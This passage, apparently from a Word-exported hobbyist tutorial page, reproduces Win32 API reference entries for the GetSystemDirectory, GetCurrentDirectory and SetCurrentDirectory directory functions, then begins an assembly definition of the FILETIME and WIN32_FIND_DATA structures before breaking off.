style="mso-spacerun: yes">  </span>Windows directory is the root directory. For
example, if the Windows <span style="mso-spacerun: yes">       </span>directory
is named WINDOWS on drive C, the path of the Windows directory retrieved by
this function is C:\WINDOWS. If Windows was installed<span style="mso-spacerun:
yes">  </span>in the root directory of drive C, the path retrieved is C:\.<span
style="mso-spacerun: yes">            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>uSize: Specifies the maximum size, in characters, of the buffer
specified by the lpBuffer parameter. This value should be set to at least
MAX_PATH to allow sufficient room in the buffer for the path.<span
style="mso-spacerun: yes">           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                           
</span><span style="mso-spacerun: yes"> </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value is the length, in chars,
of<span style="mso-spacerun: yes">  </span>the string copied to the buffer, not
including the terminating null<span style="mso-spacerun: yes"> 
</span>character. If the length is greater than the size of the buffer, the
return value<span style="mso-spacerun: yes">  </span>is the size of the buffer
required to hold the path.<span style="mso-spacerun: yes">                   
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>The GetSystemDirectory function retrieves the path of the Windows system
directory. The system directory contains such files as Windows libraries<span
style="mso-spacerun: yes">  </span>drivers, and font files.<span
style="mso-spacerun: yes">                                                 
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>UINT GetSystemDirectory(<span style="mso-spacerun:
yes">                                                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPTSTR lpBuffer,<span style="mso-spacerun: yes">    </span>// address of
buffer for system directory<span style="mso-spacerun: yes">           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>UINT uSize<span style="mso-spacerun: yes">  </span>// size of directory
buffer<span style="mso-spacerun: yes">                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun: yes">                    </span><span
style="mso-spacerun:
yes">                                                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpBuffer: Points to the buffer to receive the null-terminated string
containing the path. This path does not end with a backslash unless da<span
style="mso-spacerun: yes">  </span>system directory is the root directory. For
example, if the system<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>directory is named WINDOWS\SYSTEM on drive C, the path of the system
directory retrieved by this function is C:\WINDOWS\SYSTEM.<span
style="mso-spacerun: yes">              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>uSize: Specifies the maximum size of the buffer, in characters. This
value should be set to at least MAX_PATH. <span style="mso-spacerun:
yes">                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value is the length, in chars,
of<span style="mso-spacerun: yes">  </span>the string copied to the buffer, not
including the terminating null<span style="mso-spacerun: yes"> 
</span>character. If the length is greater than the size of the buffer, the
return value is the size of the buffer required to hold the path.<span
style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                      </span><span style="mso-spacerun:
yes">                                       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                </span><span
style="mso-spacerun: yes">                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>The GetCurrentDirectory function retrieves the current directory for
the<span style="mso-spacerun: yes">  </span>current process.<span
style="mso-spacerun: yes">                                                         
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                         
</span><span style="mso-spacerun: yes">   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>DWORD GetCurrentDirectory(<span style="mso-spacerun:
yes">                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>DWORD nBufferLength,<span style="mso-spacerun: yes">        </span>//
size in characters, of directory buffer<span style="mso-spacerun: yes">  
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPTSTR lpBuffer<span style="mso-spacerun: yes">     </span>// address of
buffer for current directory<span style="mso-spacerun: yes">          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun: yes">            </span><span
style="mso-spacerun:
yes">                                                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>nBufferLength: Specifies the length, in characters, of the buffer
for<span style="mso-spacerun: yes">  </span>the current directory string. The
buffer length must include room for<span style="mso-spacerun: yes">    </span>a
terminating null character.<span style="mso-spacerun: yes">                                          
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>lpBuffer: Points to the buffer for the current directory string. This null-terminated
string specifies the absolute path to the current directory.<span
style="mso-spacerun:
yes">                                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun: yes">                       
</span><span style="mso-spacerun: yes">                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value specifies the number of<span
style="mso-spacerun: yes">  </span>characters written to the buffer, not
including the terminating null<span style="mso-spacerun: yes">  
</span>character.<span style="mso-spacerun:
yes">                                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>The SetCurrentDirectory function changes the current directory for the
current process.<span style="mso-spacerun:
yes">                                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>BOOL SetCurrentDirectory(<span style="mso-spacerun:
yes">                                                 </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPCTSTR lpPathName<span style="mso-spacerun: yes">  </span>// address of
name of new current directory<span style="mso-spacerun: yes">         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                  </span><span
style="mso-spacerun: yes">              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpPathName: Points to a null-terminated string that specifies the
path<span style="mso-spacerun: yes">  </span>to the new current directory. This
parameter may be a relative path or<span style="mso-spacerun: yes">   </span>a
fully qualified path. In either case, the fully qualified path of<span
style="mso-spacerun: yes">     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>the specified directory is calculated and stored as the current<span
style="mso-spacerun: yes">   </span>directory.<span style="mso-spacerun:
yes">                                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                     </span><span style="mso-spacerun:
yes">                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function succeeds, the return value is nonzero.<span
style="mso-spacerun: yes">                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                           </span><span
style="mso-spacerun: yes">            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>struttura WIN32_FIND_DATA<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>MAX_PATH<span style="mso-spacerun: yes">                </span>equ<span
style="mso-spacerun: yes">     </span>260<span style="mso-spacerun: yes"> 
</span>&lt;-- The maximum size of a path<span style="mso-spacerun: yes">      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>FILETIME<span style="mso-spacerun: yes">               
</span>STRUC<span style="mso-spacerun: yes">        </span>&lt;-- Struture for
handle the time,<span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>FT_dwLowDateTime<span style="mso-spacerun: yes">        </span>dd<span
style="mso-spacerun: yes">      </span>?<span style="mso-spacerun: yes">       
</span>present in many Win32 strucs<span style="mso-spacerun: yes">     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>FT_dwHighDateTime<span style="mso-spacerun: yes">       </span>dd<span
style="mso-spacerun: yes">      </span>?<span style="mso-spacerun:
yes">                                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>FILETIME<span style="mso-spacerun: yes">                </span>ENDS<span
style="mso-spacerun: yes">                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span><span style="mso-spacerun:
yes">                                                                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WIN32_FIND_DATA<span style="mso-spacerun: yes">        
</span>STRUC<span style="mso-spacerun:
yes">                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_dwFileAttributes<span style="mso-spacerun: yes">    </span>dd<span
style="mso-spacerun: yes">      </span>?<span style="mso-spacerun: yes">   
</span>&lt;-- Contains the file attributtes<span style="mso-spacerun: yes">   
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_ftCreationTime<span style="mso-spacerun: yes">      </span>FILETIME
?<span style="mso-spacerun: yes">   </span>&lt;-- Moment when da file was
created<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span></span><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:
"Courier New";color:#CCFFFF'>WFD_ftLastAccessTime<span style="mso-spacerun:
yes">    </span>FILETIME ?<span style="mso-spacerun: yes">   </span></span><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>&lt;-- Last time when file was accessed <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
